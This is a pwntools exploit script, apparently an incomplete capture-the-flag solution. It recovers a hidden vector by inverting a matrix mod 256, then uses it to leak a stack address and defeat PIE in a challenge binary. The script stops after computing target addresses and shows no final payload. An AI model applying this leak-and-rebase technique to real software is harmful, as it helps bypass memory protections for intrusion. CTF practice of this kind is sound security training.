#!/usr/bin/env python3
from pwn import *
import numpy as np
from sympy import Matrix

def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ("server", "port")
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

gdbscript = """
continue
"""
# init-pwndbg

libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
exe = "./main"
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.log_level = "debug"

s = lambda data: io.send(data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
sla = lambda msg, data: io.sendlineafter(msg, data)
info = lambda msg: log.info(msg)
recvunt = lambda msg: io.recvuntil(msg)

# ===================EXPLOIT GOES HERE=======================

io = start()

# Get B
sla(b'> \n', b'1')
B = []
for i in range(16):
    col = []
    for j in range(16):
        col.append(int(io.recvline().strip().decode()))
    B.append(col)
B = np.array(B)
B = B.T
print('#' * 30 + 'Matrix B ' + '#' * 30)
print(B)

# Calculate B inverse mod 256
B_sym = Matrix(B.tolist()).as_mutable() # GPT
B_inv_mod256 = B_sym.inv_mod(256)

print('#' * 30 + 'Matrix B Inverse ' + '#' * 30)
B_inv = np.array(B_inv_mod256.tolist(), dtype=np.uint8)

print('#' * 30 + 'Verify B * B_inv % 256 ' + '#' * 30)
print(B @ B_inv % 256)

# Get A = B x C
sla(b'> \n', b'3')
A = []
for i in range(16):
    A.append(int(io.recvline().strip().decode()))
A = np.array(A)
print('#' * 30 + 'Matrix A ' + '#' * 30)
print(A)

# Get C = B_inv
C = B_inv @ A % 256
print('#' * 30 + 'Matrix C ' + '#' * 30)
print(C)

# Calculate leak
stack_leak = 0
for i in range(7):  # i from 0 to 6 for C[1] to C[7]
    stack_leak |= C[i + 1] << (8 * i)

info("Stack leak:" + hex(stack_leak))

pie_leak = 0
for i in range(6):  # i from 0 to 5 for C[9] to C[14]
    pie_leak |= C[i + 9] << (8 * i)

elf.address = pie_leak - 0x1d1f - 0xcf
info("PIE leak:" + hex(elf.address))

print_func = elf.address + 0x1D2A 
flag = elf.address + 0x040C0
target = flag + 0x110
# gdb.attach(io)

io.interactive()

